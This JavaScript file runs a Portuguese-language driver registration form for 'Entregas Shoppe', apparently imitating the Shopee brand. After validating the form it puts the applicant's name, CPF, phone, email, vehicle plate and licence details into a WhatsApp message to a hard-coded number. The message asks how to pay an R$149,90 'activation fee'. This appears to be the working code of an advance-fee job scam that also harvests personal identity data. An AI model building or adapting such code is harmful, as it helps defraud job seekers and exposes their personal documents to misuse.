document.addEventListener('DOMContentLoaded', function() {
    const driverForm = document.getElementById('driverForm');
    const tipoVeiculoSelect = document.getElementById('tipoVeiculo');
    const outroVeiculoGroup = document.getElementById('outroVeiculoGroup');
    const outroVeiculoInput = document.getElementById('outroVeiculo');

    // Elementos da Modal
    const successModal = document.getElementById('successModal');
    const closeButton = successModal.querySelector('.close-button');
    const whatsappRedirectBtn = document.getElementById('whatsappRedirectBtn');

    // Função para mostrar a modal
    function showModal() {
        successModal.classList.add('show');
    }

    // Função para esconder a modal
    function hideModal() {
        successModal.classList.remove('show');
    }

    // Event listeners para fechar a modal
    closeButton.addEventListener('click', hideModal);
    window.addEventListener('click', function(event) {
        if (event.target === successModal) {
            hideModal();
        }
    });

    // Função para mostrar/esconder o campo "Qual veículo?"
    if (tipoVeiculoSelect) {
        tipoVeiculoSelect.addEventListener('change', function() {
            if (this.value === 'outro') {
                outroVeiculoGroup.style.display = 'block';
                outroVeiculoInput.setAttribute('required', 'required');
            } else {
                outroVeiculoGroup.style.display = 'none';
                outroVeiculoInput.removeAttribute('required');
                outroVeiculoInput.value = ''; // Limpa o campo se não for mais "outro"
            }
        });
    }

    // Manipulação de upload de arquivo para exibir nome do arquivo
    const fileInputs = [
        { input: document.getElementById('uploadCnh'), nameSpan: document.getElementById('fileCnhName') },
        { input: document.getElementById('uploadCrlv'), nameSpan: document.getElementById('fileCrlvName') },
        { input: document.getElementById('uploadComprovante'), nameSpan: document.getElementById('fileComprovanteName') }
    ];

    fileInputs.forEach(item => {
        if (item.input && item.nameSpan) {
            item.input.addEventListener('change', function() {
                if (this.files.length > 0) {
                    item.nameSpan.textContent = this.files[0].name;
                } else {
                    item.nameSpan.textContent = 'Nenhum arquivo selecionado';
                }
            });
        }
    });

    // Lógica de submissão do formulário: valida e mostra a modal customizada
    if (driverForm) {
        driverForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Impede o envio padrão do formulário

            // Validação simples de campos obrigatórios
            let isValid = true;
            const requiredInputs = driverForm.querySelectorAll('[required]');

            requiredInputs.forEach(input => {
                if (!input.value.trim()) {
                    isValid = false;
                    input.style.borderColor = 'red'; // Feedback visual
                } else {
                    input.style.borderColor = '#ced4da'; // Reset para cor padrão
                }
            });

            if (!isValid) {
                alert('Por favor, preencha todos os campos obrigatórios.'); // Mantém alerta para validação de campos
                return;
            }

            // --- COLETAR DADOS DO FORMULÁRIO ---
            const nomeCompleto = document.getElementById('nome').value;
            const cpf = document.getElementById('cpf').value;
            const telefone = document.getElementById('telefone').value;
            const email = document.getElementById('email').value;
            const tipoVeiculo = document.getElementById('tipoVeiculo').value;
            const modeloVeiculo = document.getElementById('modeloVeiculo').value;
            const placaVeiculo = document.getElementById('placaVeiculo').value;
            const cnhCategoria = document.getElementById('cnhCategoria').value;
            const ear = document.getElementById('ear').checked ? 'Sim' : 'Não';
            const tempoExperiencia = document.getElementById('tempoExperiencia').value;
            const disponibilidade = document.getElementById('disponibilidade').value;
            const comoConheceu = document.getElementById('comoConheceu').value;
            const outroVeiculo = tipoVeiculo === 'outro' ? document.getElementById('outroVeiculo').value : '';

            // Construir a mensagem do WhatsApp com os dados do formulário
            let whatsappMessageText = `*SOLICITAÇÃO DE PAGAMENTO DE TAXA - ENTREGAS SHOPPE*\n\n`;
            whatsappMessageText += `Olá! Acabei de me cadastrar na Entregas Shoppe e gostaria de prosseguir com o pagamento da taxa de ativação de R$149,90.\n\n`;
            whatsappMessageText += `*Meus Dados de Cadastro:*\n`;
            whatsappMessageText += `Nome Completo: ${nomeCompleto}\n`;
            whatsappMessageText += `CPF: ${cpf}\n`;
            whatsappMessageText += `Telefone: ${telefone}\n`;
            whatsappMessageText += `E-mail: ${email}\n`;
            whatsappMessageText += `Tipo de Veículo: ${tipoVeiculo}`;
            if (tipoVeiculo === 'outro') {
                whatsappMessageText += ` (${outroVeiculo})\n`;
            } else {
                whatsappMessageText += `\n`;
            }
            whatsappMessageText += `Modelo do Veículo: ${modeloVeiculo}\n`;
            whatsappMessageText += `Placa do Veículo: ${placaVeiculo}\n`;
            whatsappMessageText += `CNH Categoria: ${cnhCategoria} (EAR: ${ear})\n`;
            whatsappMessageText += `Tempo de Experiência: ${tempoExperiencia}\n`;
            whatsappMessageText += `Disponibilidade: ${disponibilidade}\n`;
            if (comoConheceu) {
                whatsappMessageText += `Como nos conheceu: ${comoConheceu}\n`;
            }
            whatsappMessageText += `\n*Aguardando suas instruções para o pagamento e ativação do meu perfil.*`;

            // Codificar a mensagem para URL
            const encodedMessage = encodeURIComponent(whatsappMessageText);

            // Número de WhatsApp da sua empresa (com código do país e DDD)
            const whatsappNumber = '5511911869145'; // Seu número de WhatsApp aqui

            // --- MOSTRAR MODAL CUSTOMIZADA EM VEZ DE ALERT ---
            showModal(); // Mostra a modal customizada

            // Configura o botão "Ir para o WhatsApp" dentro da modal
            whatsappRedirectBtn.onclick = function() {
                hideModal(); // Esconde a modal ao clicar no botão
                window.location.href = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
            };
        });
    }
});